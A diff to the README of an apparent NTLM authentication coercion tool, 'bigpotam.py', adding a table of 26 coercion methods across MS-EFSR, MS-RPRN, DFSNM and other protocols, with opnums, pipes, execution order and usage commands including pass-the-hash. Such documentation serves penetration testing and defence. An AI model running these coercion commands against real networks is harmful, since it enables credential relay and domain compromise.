@@ -2,19 +2,6 @@
 
 Unified NTLM authentication coercion tool. Consolidates all known coercion primitives across 8 protocols into a single tool with stop-on-first-success behavior.
 
-## Protocols & Methods (26 total)
-
-| Protocol | Methods | Pipe / Transport | WebDAV |
-|----------|---------|-------------------|--------|
-| MS-EFSR | 11 functions (opnums 0,4,5,6,7,8,9,12,13,15,16) | lsarpc, efsrpc, samr, lsass, netlogon | Yes |
-| MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification (62), Ex (65), Ex via EPM | spoolss / dcerpc | Yes |
-| MS-PAR | RpcAsyncOpenPrinter (0) | spoolss | No |
-| MS-DFSNM | 6 functions (opnums 12,13,14,15,23,24) | netdfs | Partial |
-| MS-FSRVP | IsPathSupported (8), IsPathShadowCopied (9) | FssagentRpc | Yes |
-| MS-EVEN | ElfrOpenBELW (9) | eventlog | No |
-| MS-WSP | WSP Connect/Query/Disconnect | MsFteWds (SMB pipe) | No |
-| DCOM | UpdateSession.AddScanPackageService | DCOM port 135 | No |
-
 ## Installation
 
 ```bash
@@ -39,7 +26,7 @@ python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR
 # Target a specific method
 python3 bigpotam.py domain/user:password@target 10.0.0.5 -method EfsRpcEncryptFileSrv
 
-# Try all EFSR named pipes (not just lsarpc)
+# Try all EFSR named pipes (not just lsarpc/efsrpc)
 python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -all-pipes
 
 # Pass-the-hash
@@ -82,11 +69,55 @@ output:
   -debug              Verbose debug output
 ```
 
+## Protocols & Methods (26 total)
+
+| Protocol | Methods | Pipe / Transport | WebDAV |
+|----------|---------|-------------------|--------|
+| MS-EFSR | 11 functions | lsarpc, efsrpc, samr, lsass, netlogon | Yes |
+| MS-RPRN | 3 methods | spoolss / dcerpc | Yes |
+| MS-PAR | 1 method | spoolss | No |
+| MS-DFSNM | 6 functions | netdfs | Partial |
+| MS-FSRVP | 2 functions | FssagentRpc | Yes |
+| MS-EVEN | 1 function | eventlog | No |
+| MS-WSP | Connect/Query/Disconnect | MsFteWds (SMB pipe) | No |
+| DCOM | AddScanPackageService | DCOM port 135 | No |
+
+### All Methods
+
+| # | Protocol | Method | Opnum | Pipe | Notes |
+|---|----------|--------|-------|------|-------|
+| 1 | MS-EFSR | EfsRpcEncryptFileSrv | 4 | lsarpc/efsrpc | |
+| 2 | MS-EFSR | EfsRpcDecryptFileSrv | 5 | lsarpc/efsrpc | |
+| 3 | MS-EFSR | EfsRpcQueryUsersOnFile | 6 | lsarpc/efsrpc | |
+| 4 | MS-EFSR | EfsRpcQueryRecoveryAgents | 7 | lsarpc/efsrpc | |
+| 5 | MS-EFSR | EfsRpcRemoveUsersFromFile | 8 | lsarpc/efsrpc | |
+| 6 | MS-EFSR | EfsRpcAddUsersToFile | 9 | lsarpc/efsrpc | |
+| 7 | MS-EFSR | EfsRpcFileKeyInfo | 12 | lsarpc/efsrpc | |
+| 8 | MS-EFSR | EfsRpcDuplicateEncryptionInfoFile | 13 | lsarpc/efsrpc | |
+| 9 | MS-EFSR | EfsRpcAddUsersToFileEx | 15 | lsarpc/efsrpc | |
+| 10 | MS-EFSR | EfsRpcFileKeyInfoEx | 16 | lsarpc/efsrpc | |
+| 11 | MS-EFSR | EfsRpcOpenFileRaw | 0 | lsarpc/efsrpc | Patched — tried last |
+| 12 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification | 62 | spoolss | |
+| 13 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | spoolss | |
+| 14 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | dcerpc (EPM) | Dynamic TCP endpoint |
+| 15 | MS-PAR | RpcAsyncOpenPrinter | 0 | spoolss | |
+| 16 | MS-DFSNM | NetrDfsAddStdRoot | 12 | netdfs | |
+| 17 | MS-DFSNM | NetrDfsAddStdRootForced | 15 | netdfs | SMB only |
+| 18 | MS-DFSNM | NetrDfsAddRootTarget | 23 | netdfs | SMB only |
+| 19 | MS-DFSNM | NetrDfsRemoveRootTarget | 24 | netdfs | SMB only |
+| 20 | MS-DFSNM | NetrDfsRemoveStdRoot | 13 | netdfs | |
+| 21 | MS-DFSNM | NetrDfsManagerInitialize | 14 | netdfs | SMB only |
+| 22 | MS-FSRVP | IsPathSupported | 8 | FssagentRpc | |
+| 23 | MS-FSRVP | IsPathShadowCopied | 9 | FssagentRpc | |
+| 24 | MS-EVEN | ElfrOpenBELW | 9 | eventlog | SMB only, device path |
+| 25 | MS-WSP | WSP Connect/Query | — | MsFteWds | Binary protocol, not RPC |
+| 26 | DCOM | UpdateSession.AddScanPackageService | — | port 135 | Machine account coercion |
+
 ## Execution Order
 
 When `-all` is not set, methods are tried in this order (most reliable first):
 
-1. **MS-EFSR** via lsarpc — 11 functions, universally accessible pipe
+1. **MS-EFSR** via lsarpc/efsrpc — 11 functions, universally accessible pipe
 2. **MS-RPRN** via spoolss — PrinterBug (opnum 62 and 65)
 3. **MS-RPRN** via EPM/TCP — dynamic endpoint when spoolss pipe is blocked
 4. **MS-PAR** — RpcAsyncOpenPrinter
